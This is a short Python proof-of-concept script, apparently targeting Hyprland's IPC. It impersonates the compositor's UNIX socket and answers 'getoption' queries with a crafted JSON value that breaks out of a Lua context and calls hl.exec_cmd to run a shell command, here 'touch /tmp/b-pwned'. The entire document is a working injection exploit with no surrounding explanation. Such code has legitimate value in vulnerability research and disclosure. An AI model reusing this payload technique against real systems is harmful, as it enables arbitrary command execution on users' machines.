#!/usr/bin/env python3
import socket, os, json

SOCK = "/run/user/1002/hypr/fakeinst/.socket.sock"
PAYLOAD = 'false } }) hl.exec_cmd("touch /tmp/b-pwned") --'

try:
    os.unlink(SOCK)
except FileNotFoundError:
    pass

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.bind(SOCK)
s.listen(16)
print(f"Listening on {SOCK}")

while True:
    c, _ = s.accept()
    req = c.recv(4096).decode("utf-8", "replace")
    print(f"Got request: {req!r}")
    if "getoption" in req:
        reply = json.dumps({"option": req.strip(), "bool": PAYLOAD, "set": True})
        c.sendall(reply.encode())
    else:
        c.sendall(b"ok")
    c.close()
